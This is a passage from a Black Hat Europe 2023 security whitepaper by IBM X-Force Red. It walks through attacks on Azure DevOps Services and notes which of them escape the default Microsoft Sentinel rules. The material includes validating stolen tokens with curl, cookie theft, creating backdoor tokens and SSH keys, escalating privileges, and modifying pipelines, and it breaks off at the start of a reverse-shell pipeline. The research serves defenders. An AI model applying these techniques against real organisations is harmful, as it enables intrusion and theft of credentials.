---
title: "Hiding in the Clouds Abusing Azure DevOps Services to Bypass Microsoft Sentinel Analytic Rules"
speakers: ["Brett Hawkins"]
conference: "Black Hat"
conference_full: "Black Hat Europe 2023"
edition: "Europe"
year: 2023
source_pdf: "Black Hat Europe 2023 slides/Brett Hawkins_Hiding in the Clouds Abusing Azure DevOps Services to Bypass Microsoft Sentinel Analytic Rules_wp.pdf"
pages: 112
sha256: "2171e50a08c32630b5d4ec603dbb1e01280916dda4cb9cda54e54014e13242e5"
text_chars: 106227
ocr_pages: 0
has_ocr: false
redacted_secrets: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2"
converted_at: "2026-08-11T23:57:46Z"
---
# Hiding in the Clouds Abusing Azure DevOps Services to Bypass Microsoft Sentinel Analytic Rules

**Speakers:** Brett Hawkins  
**Conference:** Black Hat Europe 2023  
**Source:** `Black Hat Europe 2023 slides/Brett Hawkins_Hiding in the Clouds Abusing Azure DevOps Services to Bypass Microsoft Sentinel Analytic Rules_wp.pdf` (112 pages)

## Slide 1

# Hiding in the Clouds:

# Abusing Azure DevOps Services to Bypass Microsoft Sentinel Analytic Rules

Author:

Brett Hawkins

Adversary Services, IBM X-Force Red

November 6, 2023

## Slide 2

# Document Tracking

Data Classification: PUBLIC

|**Version**|**Date**|**Author**|**Notes**|
|---|---|---|---|
|1.0|Nov 6,2023|Brett Hawkins|Public Release|

IBM X-Force Red | November 6, 2023

2

## Slide 3

## TABLE OF CONTENTS

|ABSTRACT
5|
|---|
|BACKGROUND
6|
|PRIORWORK
6|
|AZUREDEVOPSSERVICES- HISTORY
7|
|AZUREDEVOPSSERVICES VS. AZUREDEVOPSSERVER
7|
|AZUREDEVOPSSERVICES- COMMONTERMINOLOGY
8|
|AZUREDEVOPSSERVICES- ACCESS ANDAUTHORIZATION
8|
|AZUREDEVOPSSERVICES- LOGGING
10|
|MICROSOFTSENTINELANALYTICRULES FORAZUREDEVOPSSERVICES
11|
|ATTACKING AZURE DEVOPS SERVICES
13|
|INITIALACCESS
13|
|RECONNAISSANCE
16|
|PERSISTENCE
24|
|PRIVILEGEESCALATION
30|
|DEFENSEEVASION
62|
|BYPASSING AND IMPROVING MICROSOFT SENTINEL ANALYTIC RULES FOR AZURE|
|DEVOPS SERVICES
82|
|BYPASSINGDEFAULTRULES
82|
|IMPROVINGDETECTION OFATTACKSAGAINSTAZUREDEVOPSSERVICES
87|
|ADOKIT
92|
|BACKGROUND
92|
|RECONNAISSANCE
92|
|PRIVILEGEESCALATION
95|
|IBM X-Force Red |November 6, 2023
3|

## Slide 4

|PERSISTENCE|97|
|---|---|
|DEFENSIVE CONSIDERATIONS|99|
|ADOKIT|99|
|AZUREDEVOPSSERVICESPLATFORM|101|
|CONCLUSION|103|
|ACKNOWLEDGMENTS|104|
|APPENDIX A: ATTACK SCENARIOS DETECTION TABLE|105|
|APPENDIX B: PERMISSIONS REQUIRED FOR ATTACK SCENARIOS|108|

IBM X-Force Red | November 6, 2023

4

## Slide 5

# Abstract

Development Operations (DevOps) platforms continue to be high-value systems that attackers target through software supply chain attacks and source code theft attacks. Azure DevOps Services has become one of the popular DevOps platforms due to organizations adopting cloud solutions more heavily. Logging actions conducted in cloud-based services has become more important than ever, as shown in the attacks conducted by the Storm-0558<sup>1</sup> threat actor group against Microsoft cloud-based services. Sufficient logging level and understanding of the logged events is critical to be able to develop detection rules within a security information and event management (SIEM) platform for attacker activity. A common cloud-based SIEM used with Microsoft cloud-based services is Microsoft Sentinel.

This whitepaper will give a background on Azure DevOps Services, along with showing how to perform several attacks against the cloud-based platform. These attacks will include reconnaissance, privilege escalation, persistence, and defense evasion. The attacks will demonstrate that it is possible to bypass the default Microsoft Sentinel analytic rules for Azure DevOps Services. Defensive guidance will be provided on protecting against these attacks and improving the default Microsoft Sentinel analytic rules for Azure DevOps Services. Additionally, X-Force Red has developed a tool called Azure DevOps Services attack toolkit (ADOKit), which will be used to perform several of these attacks.

> 1 For more information on the Storm-0558 threat actor group, see https://www.microsoft.com/enus/security/blog/2023/07/14/analysis-of-storm-0558-techniques-for-unauthorized-email-access/

IBM X-Force Red | November 6, 2023

5

## Slide 6

# Background

## PRIOR WORK

### **Abusing Service Connections**

There have been several excellent write-ups on abusing service connections to obtain credential information for service principals. These write-ups, along with the author(s) are detailed below.

- There is an article on extracting an access token for a service principal from a service connection and how to detect that attack titled `Service Principals in Azure DevOps(Release) Pipelines`<sup>2</sup> by Joosua Santasalo<sup>3</sup> , Sami Lamppu<sup>4</sup> and Thomas Naunheim<sup>5</sup> . This X-Force Red whitepaper shows how to extract service principal key credentials, rather than a service principal access token.

- An article titled `Performing and Preventing Attacks on Azure Cloud Environments through Azure DevOps`<sup>6</sup> by Matthew Lucas covers how to perform a phishing attack to steal a personal access token for Azure DevOps. After that, Matthew covers how to use a stolen personal access token to send service principal key credentials from a service connection to a web server via a modified pipeline.

- Another great article on retrieving service principal credentials via a service connection is titled `Your service connection credentials are mine`<sup>7</sup> by Jev Suchoi<sup>8</sup> . Jev shows how to obtain these service principal credentials and display them in Base64-encoded format. This X-Force Red whitepaper includes other methods of displaying the service principal credentials, such as displaying the credentials in halves or in reverse order to bypass Azure DevOps Services security controls for displaying secrets.

- Melvin Langvik<sup>9</sup> also has an article titled `Abusing pipelines to hijack production`<sup>10</sup> that shows how to steal service principal credentials from a

2 https://github.com/Cloud-Architekt/AzureAD-Attack-Defense/blob/main/ServicePrincipals-ADO.md

3 https://twitter.com/SantasaloJoosua

4 https://twitter.com/samilamppu

> 5 https://twitter.com/Thomas_Live

6 https://labs.withsecure.com/publications/performing-and-preventing-attacks-on-azure-cloudenvironments-through-azure-devops

7 https://www.devjev.nl/posts/2022/your-service-connection-credentials-are-mine/

- 8 https://twitter.com/DevJevNL

9 https://twitter.com/Flangvik

10 https://flangvik.com/azure/devops/privesc/abuse/2020/10/15/from-pipeline-to-production.html

IBM X-Force Red | November 6, 2023

6

## Slide 7

service connection and display them in Base64-encoded format. Other methods of displaying service credentials are shown in this X-Force Red whitepaper.

- An article by Pascal Naber<sup>11</sup> titled `“Backdoor” in Azure DevOps to get the password of a Service Principal`<sup>12</sup> shows how to get the service principal key credentials from a service connection by modifying a pipeline. To bypass the Azure DevOps Services security controls, Pascal shows displaying the credentials in hex format. This X-Force Red whitepaper includes other methods of displaying service principal credentials to bypass the Azure DevOps Services security controls.

### **Retrieve Build Variables and Secrets**

In addition to Jev Suchoi’s previously mentioned article on abusing service connections, Jev also has an article on how to retrieve pipeline variables and secrets titled `I am in your pipeline reading all your secrets!`<sup>13</sup> . To extract the build secrets, Jev shows modifying a pipeline and displaying the secrets via Base64Encoding. This X-Force Red whitepaper includes other methods of displaying build variable secrets to bypass Azure DevOps Services security controls.

## AZURE DEVOPS SERVICES - HISTORY

In 2005, Microsoft launched Team Foundation Server (TFS), and once cloud services started to become more common in 2019, Microsoft rebranded TFS<sup>14</sup> to Azure DevOps. This included both rebranding TFS server to Azure DevOps Server, as well as Microsoft Visual Studio Team Services (VSTS) to Azure DevOps Services.

## AZURE DEVOPS SERVICES VS. AZURE DEVOPS SERVER

The primary difference between Azure DevOps Services and Azure DevOps Server is that Azure DevOps Services is a cloud offering whereas Azure DevOps Server is an onpremises offering. Microsoft has a great guide that outlines the differences between the

> 11 https://www.linkedin.com/in/pascalnaber/

> 12 https://pascalnaber.wordpress.com/2020/01/04/backdoor-in-azure-devops-to-get-the-passwordof-a-service-principal/

> 13 https://www.devjev.nl/posts/2022/i-am-in-your-pipeline-reading-all-your-secrets/

> 14 For more information on the rebranding of VSTS to Azure DevOps Services, see

> https://learn.microsoft.com/en-us/azure/devops/server/tfs-is-now-azure-devops-server?view=azuredevops

IBM X-Force Red | November 6, 2023

7

## Slide 8

two solutions here<sup>15</sup> . The research in this X-Force Red whitepaper focuses on Azure DevOps Services.

## AZURE DEVOPS SERVICES - COMMON TERMINOLOGY

Azure DevOps Services is a cloud-based service offered by Microsoft that includes the following components:

- **Azure Boards** - Track tasks needing completed.

- **Azure Pipelines** – Continuous Integration and Continuous Delivery (CI/CD) component.

- **Azure Repos** - This is the source code management piece where your code lives, you submit pull requests, etc.

- **Azure Test Plans** - Ability to perform unit testing on your project, which includes test plans, parameters, configurations, and historical runs of your tests.

- **Azure Artifacts** - Artifact management similar to Artifactory<sup>16</sup> for example.

The most important common terms are listed below. For a full listing, see here<sup>17</sup> .

- **Projects** - A single project contains all the previously mentioned services for that project. Think of this as a container for your code, pipeline, project tracking, test plan and artifacts all in one place for a single project. A project can have one to many of those services (e.g., one to many repositories or pipelines).

- **Collection/Organization** - This is a container for all projects, so it contains one to many projects within it. An Azure tenant can have one to many Azure DevOps Services organizations.

- **Team** - This is a set of project members that can be defined.

## AZURE DEVOPS SERVICES - ACCESS AND AUTHORIZATION

There are two primary ways to access Azure DevOps Services:

15 For more information on the differences between Azure DevOps Services and Azure DevOps Server, see https://learn.microsoft.com/en-us/azure/devops/user-guide/about-azure-devops-servicestfs?view=azure-devops

16 For more information on Artifactory, see https://jfrog.com/artifactory/

17 For a full listing of common terms, see https://learn.microsoft.com/enus/azure/devops/project/navigation/glossary?view=azure-devops

IBM X-Force Red | November 6, 2023

8

## Slide 9

- REST API - Programmatic access is possible via the Azure DevOps Services REST API<sup>18</sup>

- Web Interface - You can access an organization's Azure DevOps Services instance via `https://dev.azure.com/{yourorganization}` .

### **REST API Access**

You can access the REST API via OAuth 2.0<sup>19</sup> or via the use of personal access tokens<sup>20</sup> . When using either of these authentication mechanisms, you can apply any of the scopes listed here<sup>21</sup> for access to the Azure DevOps Services REST API. The core components that you can configure for REST API access are listed below.

|Agent Pools|Analytics|Audit Log|Build|
|---|---|---|---|
|Code|Entitlements|Extensions|Graph & Identity|
|Load Test|Machine Group|Marketplace|Notifications|
|Packaging|Project and Team|Release|Security|
|Service
Connections|Settings|Symbols|Task Groups|
|Team Dashboard|Test Management|Tokens|User Profile|
|Variable Groups|Wiki|Work Items||

_Table of components able to be interacted with via REST API_

### **Permissions and Security Groups**

Security groups within Azure DevOps Services are divided into two main categories, which are at the project level, or at the organization/collection level. These security

18 For more information about the Azure DevOps REST API, see https://learn.microsoft.com/enus/rest/api/azure/devops/?view=azure-devops-rest-7.1 19 For more information about accessing the REST API via OAuth 2.0, see https://learn.microsoft.com/en-us/azure/devops/integrate/getstarted/authentication/oauth?view=azure-devops 20 For more information about accessing the REST API via personal access tokens, see https://learn.microsoft.com/en-us/azure/devops/organizations/accounts/use-personal-accesstokens-to-authenticate?view=azure-devops&tabs=Windows

21 For more information about REST API scopes, see https://learn.microsoft.com/enus/azure/devops/integrate/get-started/authentication/oauth?view=azure-devops#scopes

IBM X-Force Red | November 6, 2023

9

## Slide 10

groups provide certain permissions for the different components within Azure DevOps Services.

### **Project Security Groups**

Full details of the groups below can be found here<sup>22</sup> .

- Build Administrators ( **Privileged Group** )

- Contributors

- Project Administrators ( **Privileged Group** )

- Project Valid Users

- Readers

- Release Administrators

### **Organization/Collection Security Groups**

Full details of the groups below can be found here<sup>23</sup> .

- Project Collection Administrators ( **Privileged Group** )

- Project Collection Build Administrators ( **Privileged Group** )

- Project Collection Build Service Accounts ( **Privileged Group** )

- Project Collection Proxy Service Accounts

- Project Collection Service Accounts ( **Privileged Group** )

- Project Collection Test Service Accounts

- Project Collection Valid Users

- Project-Scoped Users

- Security Service Group

## AZURE DEVOPS SERVICES - LOGGING

Activities conducted within Azure DevOps Services are logged in the audit log within the `AzureDevOpsAuditing` schema<sup>24</sup> . For an activity to be logged, it must be an auditable event<sup>25</sup> . An example of an auditable event would be adding a user to a project security

22 For full details on project security groups, see https://learn.microsoft.com/enus/azure/devops/organizations/security/permissions?view=azure-devops&tabs=previewpage#project-level-groups

23 For full details on organization/collection security groups, see https://learn.microsoft.com/enus/azure/devops/organizations/security/permissions?view=azure-devops&tabs=previewpage#collection-level-groups

24 For full details on the AzureDevOpsAuditing schema, see https://learn.microsoft.com/enus/azure/azure-monitor/reference/tables/azuredevopsauditing

25 For full details on all auditable events, see https://learn.microsoft.com/enus/azure/devops/organizations/audit/auditing-events

IBM X-Force Red | November 6, 2023

10

## Slide 11

group or modifying a service connection. Azure DevOps Services audit logs can be sent (streamed) to a SIEM, such as Microsoft Sentinel<sup>26</sup> where detection rules can be created for attacker activity. To create an audit log stream that can be sent to a SIEM, see this resource<sup>27</sup> from Microsoft.

## MICROSOFT SENTINEL ANALYTIC RULES FOR AZURE DEVOPS SERVICES

Microsoft Sentinel has a set of default Azure DevOps Services analytic rules<sup>28</sup> that can be applied for an Azure tenant that has an Azure DevOps Services audit log stream connected. These analytic rules can be used to created detections for attacker activity. When searching for “azure devops” within the rule templates, you will see the below rules are listed. Details for these analytic rules can be found in a Microsoft GitHub repo here<sup>29</sup> .

> 26 For details on Microsoft Sentinel, see https://learn.microsoft.com/en-us/azure/sentinel/overview 27 For details on setting up an audit log stream, see https://learn.microsoft.com/enus/azure/devops/organizations/audit/auditing-streaming

> 28 For details on Microsoft Sentinel analytic rules, see https://learn.microsoft.com/enus/azure/sentinel/detect-threats-built-in

29 For details related to the default analytic rules, see https://github.com/Azure/AzureSentinel/tree/master/Solutions/AzureDevOpsAuditing/Analytic%20Rules

IBM X-Force Red | November 6, 2023

11

## Slide 12

_Listing Azure DevOps Services rule templates_

Each of these rules can be applied in their default state, or modifications can be made to their rule logic, rule frequency, rule period, rule threshold, and much more.

IBM X-Force Red | November 6, 2023

12

## Slide 13

# Attacking Azure DevOps Services

Attacking Azure DevOps Services involves five distinct phases. This includes initial access, reconnaissance, persistence, privilege escalation and defense evasion. For each of these categories, we will show attack scenarios related to each, and any associated default Microsoft Sentinel Azure DevOps Services detections.

A listing of each attack scenario shown in this whitepaper, and whether the attack scenario is detected by the default Microsoft Sentinel Azure DevOps Services analytic rules is shown in <u>Appendix A: Attack Scenarios Detection Table. The project or</u> collection group memberships required to perform each attack scenario is listed in <u>Appendix B: Permissions Required for Attack Scenarios.</u>

## INITIAL ACCESS

Obtaining initial access to an Azure DevOps Services instance ( `https://dev.azure.com/OrganizationName` ) will typically be granted through one of the three authentication mechanisms listed below. Common methods for obtaining these types of credentials include but are not limited to file shares, intranet sites, user workstations, social engineering, or other unprotected/misconfigured internal network resources.

- **Username/Password** – Using the user’s Azure identity authentication via username and password. This may be subject to multi-factor authentication (MFA), depending on how the organization’s Azure tenant is configured.

- **Personal Access Token (PAT)** – A PAT the user has created that is typically used to commit code to repositories and interact with the REST API.

- **Authentication Cookie** – If you have obtained the `UserAuthentication` cookie that is scoped to `.dev.azure.com` , you can use that to authenticate to Azure DevOps Services. By default, this cookie is valid for seven days. This authentication cookie could be used to interact with the REST API.

### **Username/Password**

Enter the username and password `https://dev.azure.com/OrganizationName` .

at

IBM X-Force Red | November 6, 2023

13

## Slide 14

_Authenticating with username/password_

If MFA is configured, you will receive an MFA prompt.

_Approving MFA request_

After successful authentication, you would be brought to the homepage for the Azure DevOps Services organization.

IBM X-Force Red | November 6, 2023

14

## Slide 15

_Successful authentication with username/password_

### **Personal Access Token**

Before attempting to validate that a PAT is still active, you will need to base64 encode the PAT like shown below. Text in **bold** would need to be changed according to your environment.

`:~$ python >>> import base64 >>> pat = ":" + "` **yourPAT** `" >>> patBytes = pat.encode("ascii") >>> b64Bytes = base64.b64encode(patBytes) >>> b64PAT = b64Bytes.decode("ascii") >>> print(b64PAT)` **EncodedPATWillBeOutputHere** `>>>`

After you have base64 encoded the PAT, you can provide it via the below curl<sup>30</sup> command to validate it is still active. If you receive an HTTP status code of 200, then it is still active. Text in **bold** would need to be changed according to your environment.

`curl -i -s -k -X $'GET' -H $'Content-Type: application/json' -H $'User-Agent:` **Some User Agent** `' -H $'Authorization: Basic` **base64EncodedPAT** `' -H $'Host: dev.azure.com' $'https://dev.azure.com/` **YourOrganization** `'`

> 30 For more information on curl, see https://ss64.com/bash/curl.html

IBM X-Force Red | November 6, 2023

15

## Slide 16

### **Authentication Cookie**

A scenario where you could steal a user’s authentication cookie is by using SharpChrome<sup>31</sup> against a user’s workstation, as shown in the example snippet below. You could then use the `UserAuthentication` cookie to authenticate against the Azure DevOps Services instance.

_Stealing user authentication cookie via SharpChrome_

## RECONNAISSANCE

One of the first actions an attacker will perform once initial access is gained to an Azure DevOps Services instance, is to start performing reconnaissance. This includes reconnaissance of projects, repositories, files, code, users, and groups.

Observing this information can be performed via the web interface, or via the REST API. For details on performing these techniques via the REST API, see the REST API Abuse - Reconnaissance section. It should be noted that all the reconnaissance methods shown do not trigger any of the default Microsoft Sentinel Azure DevOps Services analytic rules because these reconnaissance activities are not auditable events.

> 31 For more information about SharpChrome, see https://github.com/GhostPack/SharpDPAPI

IBM X-Force Red | November 6, 2023

16

## Slide 17

The below table highlights the project or collection security groups required to perform the reconnaissance attack scenarios shown in this whitepaper. A user only needs to be a member of one of these groups to perform the correlating attack scenario.

|Attack Scenario|Project Security
Groups|Collection Security Groups|
|---|---|---|
|Projects Recon|Contributors
Readers
Project Administrators
Project Team Member
Build Administrators|Project Collection Test Service Accounts
Project Collection Proxy Service
Accounts
Project Collection Build Service
Accounts
Project Collection Administrators|
|Repo Recon|Contributors
Readers
Project Administrators
Project Team Member
Build Administrators|Project Collection Proxy Service
Accounts
Project Collection Build Service
Accounts
Project Collection Administrators|
|File Recon|Contributors
Readers
Project Administrators
Project Team Member
Build Administrators|Project Collection Proxy Service
Accounts
Project Collection Build Service
Accounts
Project Collection Administrators|
|Code Recon|Contributors
Readers
Project Administrators|Project Collection Proxy Service
Accounts
Project Collection Build Service
Accounts|

IBM X-Force Red | November 6, 2023

17

## Slide 18

||Project Team Member|Project Collection Administrators|
|---|---|---|
||Build Administrators||
|User/Group Recon|N/A|Any|

_Reconnaissance attack scenarios_

### **Projects Reconnaissance**

You can list the projects you have access to within an organization by navigating to the organization settings, and then selecting “Projects”. You can also apply a filter to search for projects by name via the text field in the upper right-hand corner labeled “Filter projects”.

_Viewing projects_

### **Repositories Reconnaissance**

Searching for repository names by keyword cannot be conducted in the web interface. Instead, you will need to rely on the REST API, as shown in the <u>REST API Abuse</u> - <u>Reconnaissance</u> section.

### **Files Reconnaissance**

You can search for files via entering `file:FileNameToSearch` into the search bar. Additionally, you can add a wild card (*) to your search like shown below. This will output what project the file was found in, and a snippet of the file contents as well.

IBM X-Force Red | November 6, 2023

18

## Slide 19

_Searching for file_

You can also chain together different search terms using the “OR” directive. An example query is shown below for searching multiple files.

```
file:Test* OR file:azure-pipelines*
```

IBM X-Force Red | November 6, 2023

19

## Slide 20

_Searching for multiple file names_

All the different search operators and filters<sup>32</sup> are shown in the screenshot below.

> 32 https://learn.microsoft.com/en-us/azure/devops/project/search/get-started-search?view=azure-devops#searchfeatures-usage-and-examples

IBM X-Force Red | November 6, 2023

20

## Slide 21

_Available search operators and filters_

### **Code Reconnaissance**

You can search for keywords within code to discover unsecured credentials or other sensitive information. This will give you the matching files that contain your search term, along with the contents of the file and highlighted matches within the file. As previously demonstrated, you can also chain together different search queries.

IBM X-Force Red | November 6, 2023

21

## Slide 22

_Example searching code_

### **User/Group Reconnaissance**

You can list the users within an organization by navigating to the organization settings, and then selecting “Users”. You can also apply a filter to search for users by name via the text field in the upper left-hand corner labeled “Filter users”.

_Listing users within organization_

IBM X-Force Red | November 6, 2023

22

## Slide 23

You can list the groups within an organization by navigating to the organization settings, and then selecting “Permissions”. You can also apply a filter to search for groups by name via the text field in the upper right-hand corner labeled “Search groups”.

_Listing groups within an organization_

If you select one of the groups, you can view the group members as shown in the below screenshot.

IBM X-Force Red | November 6, 2023

23

## Slide 24

_Listing group members for a group_

## PERSISTENCE

A user doesn’t need to be a member of a specific project security group, or collection security group to perform any of the persistence activities shown in the following sections. Both methods shown can be performed via the web interface, or via the REST API. For details on performing these techniques via the REST API, see the <u>REST API Abuse - Persistence</u> section.

### **Personal Access Token**

One method to maintain persistent access to an Azure DevOps Services instance is by creating a PAT. Navigate to the upper-right hand corner and select “Personal access tokens”.

IBM X-Force Red | November 6, 2023

24

## Slide 25

_Navigating to personal access tokens_

Select “New Token” and then input the information needed. If creating this for persistence, you will want to set the maximum expiration date, which is one year from the date the PAT is being created. Additionally, you will want the PAT to apply to any organization and have a scope of “Full access” to ensure maximum privileges.

IBM X-Force Red | November 6, 2023

25

## Slide 26

_Creating PAT_

Once the PAT has been created, the token value will be provided.  Ensure that you save the token, since it will not be viewable again. You can then use the PAT to authenticate and interact with the Azure DevOps Services instance.

IBM X-Force Red | November 6, 2023

26

## Slide 27

_Showing created PAT_

### **SSH Key**

Another method that can be used to maintain persistent access to an Azure DevOps Services instance is by creating an SSH key. Navigate to the upper-right hand corner and select “SSH public keys”.

_Navigating to SSH public keys_

IBM X-Force Red | November 6, 2023

27

## Slide 28

Select the “New Key” button.

_Creating new SSH key_

You will enter the SSH key name, and the contents of your SSH public key to be used. A private-public SSH keypair can be generated using the standard ssh-keygen<sup>33</sup> command-line utility.

> 33 https://linux.die.net/man/1/ssh-keygen

IBM X-Force Red | November 6, 2023

28

## Slide 29

_Adding public SSH key_

Once created, by default the expiration date of the SSH public key will be one year from the time it is created.

IBM X-Force Red | November 6, 2023

29

## Slide 30

_Showing created SSH key_

## PRIVILEGE ESCALATION

The below table highlights the project or collection security groups required to perform the privilege escalation attack scenarios shown in this whitepaper. A user only needs to be a member of one of these groups to perform the correlating attack scenario.

|Attack Scenario|Project Security
Groups|Collection Security Groups|
|---|---|---|
|Add User to
Privileged Project
Group|Project Administrators|Project Collection Service Accounts
Project Collection Administrators|
|Add User to
Privileged
Collection Group|N/A|Project Collection Service Accounts
Project Collection Administrators|
|Modifying Azure
DevOps Services
Build Pipeline|Contributors
Build Administrators
Project Administrators|Project Collection Build Administrators
Project Collection Service Accounts
Project Collection Administrators|
||Project Team Member||

IBM X-Force Red | November 6, 2023

30

## Slide 31

|Compromise On-
Premise Host via
Self-Hosted Agent|Contributors
Build Administrators
Project Administrators
Project Team Member|Project Collection Build Administrators
Project Collection Service Accounts
Project Collection Administrators|
|---|---|---|
|Retrieve Azure
DevOps Services
Build Variables and
Secrets|Contributors
Readers
Build Administrators
Project Administrators
Project Team Member|Project Collection Test Service Accounts
Project Collection Build Service
Accounts
Project Collection Build Administrators
Project Collection Service Accounts
Project Collection Administrators|
|Retrieve Azure Key
Vault Secrets|Contributors
Build Administrators
Project Administrators
Project Team Member|Project Collection Build Administrators
Project Collection Service Accounts
Project Collection Administrators|
|Retrieve Service
Connection
Credentials|Project Administrators|Project Collection Service Accounts
Project Collection Administrators|

_Privilege escalation attack scenarios_

### **Add User to Privileged Project Group**

There may be a scenario when an attacker has compromised the credentials for a privileged user (username/password, authentication cookie, or PAT) and would like to escalate the privileges of a non-privileged user under the attacker’s control at the project or collection level.

To escalate the privileges of a user at the project level, the stolen credentials must have the privileges of Project Administrators. Privileged project groups that an attacker may want to add a user to include Project Administrators and Build Administrators. Adding a user to a privileged project group can be performed via the web interface, or via the

IBM X-Force Red | November 6, 2023

31

## Slide 32

REST API. For details on adding users to privileged project groups via the REST API, see the REST API Abuse - Adding User to Group section.

_Adding User to Project Administrators_

When performing a project group addition via the web interface, you navigate to the project and then “Settings” → “Permissions” → “Project Administrators”. To add another project administrator, press the “Add” button.

_Listing project administrators for TestProject2_

Enter the user, group, service principal or managed identity to add to the group, and press “Save”.

IBM X-Force Red | November 6, 2023

32

## Slide 33

_Adding user to project administrators_

You will see your newly added account to the Project Administrators group.

IBM X-Force Red | November 6, 2023

33

## Slide 34

_Showing group addition_

This privilege escalation attack scenario can be detected with the default Microsoft Sentinel analytic rule “New PA, PCA, or PCAS added to Azure DevOps”, as shown in the screenshot below.

IBM X-Force Red | November 6, 2023

34

## Slide 35

_Microsoft Sentinel alert for adding Project Administrator_

### _Adding User to Build Administrators_

Adding a user to the Build Administrators group can be achieved by repeating the previously shown steps where a user was added to the Project Administrators group.

IBM X-Force Red | November 6, 2023

35

## Slide 36

_Showing user added to Build Administrators_

This action of adding a user to the Build Administrators group was not detected by any of the default Microsoft Sentinel analytic rules for Azure DevOps Services.

### **Add User to Privileged Collection Group**

To escalate the privileges of a user at the collection level, the stolen credentials must have the privileges of Project Collection Administrators or Project Collection Service Accounts.

There are several privileged collection groups that an attacker may want to add a user into. These include Project Collection Administrators, Project Collection Service Accounts, Project Collection Build Service Accounts and Project Collection Build Administrators. Adding a user to a privileged collection group can be performed via the web interface, or via the REST API. For details on adding users to privileged collection groups via the REST API, see the REST API Abuse - Adding User to Group section.

_Adding User to Project Collection Administrators_

When performing a collection group addition via the web interface, you navigate to the organization settings and then “Settings” → “Permissions” → “Project Collection Administrators”. To add another project collection administrator, press the “Add” button.

IBM X-Force Red | November 6, 2023

36

## Slide 37

_Viewing Project Collection Administrators_

Enter the user, group, service principal or managed identity to add to the group, and press “Save”.

IBM X-Force Red | November 6, 2023

37

## Slide 38

_Adding user to Project Collection Administrators_

You will see your newly added account in the Project Collection Administrators group.

IBM X-Force Red | November 6, 2023

38

## Slide 39

_Showing newly added Project Collection Administrator_

This type of privilege escalation attack scenario can be detected with the default Microsoft Sentinel analytic rule “New PA, PCA, or PCAS added to Azure DevOps”, as shown in the screenshots below.

IBM X-Force Red | November 6, 2023

39

## Slide 40

_Microsoft Sentinel rule detecting addition to Project Collection Administrators_

_Event details_

### _Adding User to Project Collection Service Accounts_

Adding a user to the Project Collection Service Accounts group can be achieved by repeating the previously shown steps where a user was added to the Project Collection Administrators group.

IBM X-Force Red | November 6, 2023

40

## Slide 41

_Adding user to Project Collection Service Accounts_

This type of privilege escalation attack scenario can be detected with the default Microsoft Sentinel analytic rule “New PA, PCA, or PCAS added to Azure DevOps”, as shown in the screenshots below.

_Microsoft Sentinel detection_

IBM X-Force Red | November 6, 2023

41

## Slide 42

_Event details_

_Adding User to Project Collection Build Administrators_

Adding a user to the Project Collection Build Administrators group can be achieved by repeating the previously shown steps where a user was added to the Project Collection Administrators group.

_Adding user to Project Collection Build Administrators_

This action of adding a user to the Project Collection Build Administrators group was not detected by any of the default Microsoft Sentinel analytic rules for Azure DevOps Services.

### **Modifying Azure DevOps Services Build Pipeline**

A common attack for an attacker to perform a software supply chain attack is by modifying an Azure DevOps Services build pipeline. If a project is using a build pipeline, there will be an `azure-pipelines.yml` file within the root of a repository belonging to a project. You can modify this file to perform whatever instructions you would like to

IBM X-Force Red | November 6, 2023

42

## Slide 43

be followed. Azure DevOps Services provides multiple options for built-in supported build tasks<sup>34</sup> . In this example, we are performing a simple inline script task.

_Modifying pipeline_

You can commit your changes after pressing the “Save” button. This could also be performed via the git command line tool<sup>35</sup> .

> 34 For more information on build tasks, see https://learn.microsoft.com/en-

> us/azure/devops/pipelines/tasks/reference/?view=azure-pipelines&viewFallbackFrom=azure-devops

> 35 For more information about git, see https://git-scm.com/downloads

IBM X-Force Red | November 6, 2023

43

## Slide 44

_Committing pipeline modifications_

Once the commit is made, this will trigger the build pipeline to run automatically. You can see that the build pipeline ran successfully after making our modifications below.

IBM X-Force Red | November 6, 2023

44

## Slide 45

_Showing build pipeline completion_

When looking at the job output of our build pipeline, you can see the code additions we made.

_Job output of modified build pipeline_

This was performed using a newly created user and it did not trigger the Microsoft Sentinel analytic rule “Azure DevOps Pipeline modified by a new user”.

You can also modify an Azure DevOps Services build pipeline using a stolen PAT and the git command line tool by cloning a repository using only the PAT, as shown below.

IBM X-Force Red | November 6, 2023

45

## Slide 46

_Cloning repository with PAT_

Then you can modify the `azure-pipelines.yml` file.

_Modifying build pipeline configuration file_

Finally, you will commit your changes to the repository. This will trigger the build pipeline to run automatically.

IBM X-Force Red | November 6, 2023

46

## Slide 47

_Pushing build pipeline changes via PAT_

Our job output is shown below from our build pipeline modification using a PAT.

_Showing job output after modifying build pipeline with PAT_

This did not trigger the Microsoft Sentinel analytic rule “Azure DevOps Personal Access Token (PAT) misuse”. Additionally, this does not trigger the Microsoft Sentinel analytic

IBM X-Force Red | November 6, 2023

47

## Slide 48

rule “Azure DevOps Pipeline modified by a new user”. This is because the rule is monitoring release pipelines<sup>36</sup> instead of build pipelines<sup>37</sup> .

### **Compromise On-Premise Host via Self-Hosted Agent**

If a build pipeline can be modified, it is possible to abuse a self-hosted agent<sup>38</sup> to compromise an on-premise host. If an organization is using a self-hosted agent, that means they will have the build pipeline instructions performed on their own infrastructure, rather than infrastructure they do not control (Microsoft-hosted agents). This can provide the ability for an attacker to pivot to an organization’s infrastructure, especially if the self-hosted agent is running on a server that is joined to the organization’s Active Directory domain.

In this example, we have identified a project that is using a self-hosted agent for its build pipeline by navigating to the project settings and selecting “Agent Pools”.

> 36 For more information on release pipelines, see https://learn.microsoft.com/enus/azure/devops/pipelines/release/?view=azure-devops

> 37 For more information on build pipelines, see https://learn.microsoft.com/en-

> us/azure/devops/pipelines/get-started/what-is-azure-pipelines?view=azure-devops 38 For more information on self-hosted agents, see https://learn.microsoft.com/enus/azure/devops/pipelines/agents/agents?view=azure-devops&tabs=browser

IBM X-Force Red | November 6, 2023

48

## Slide 49

_Identifying self-hosted agent pool_

We modify the build pipeline to perform a simple reverse shell back to our attacker infrastructure. The **bold text** would need modified based on your environment.

`# Running a reverse shell on a self-hosted runner to compromise on premises host trigger: - main pool: name: "` **Self-Hosted Runners Agent Pool** `" steps:`

IBM X-Force Red | November 6, 2023

49

## Slide 50

